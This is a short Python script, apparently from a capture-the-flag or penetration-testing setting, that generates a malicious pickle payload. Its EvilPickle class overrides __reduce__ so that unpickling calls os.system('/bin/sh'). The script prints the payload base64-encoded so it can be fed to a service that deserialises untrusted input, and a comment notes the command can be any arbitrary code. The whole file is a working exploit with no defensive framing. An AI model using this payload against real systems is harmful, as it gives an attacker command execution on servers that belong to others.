import pickle
import os
import base64
class EvilPickle(object):
    def __reduce__(self):
        #/bin/sh can be replaced with any arbitrary code to execute
        return (os.system, ('/bin/sh', ))
pickle_data = pickle.dumps(EvilPickle())
print(base64.b64encode(pickle_data,))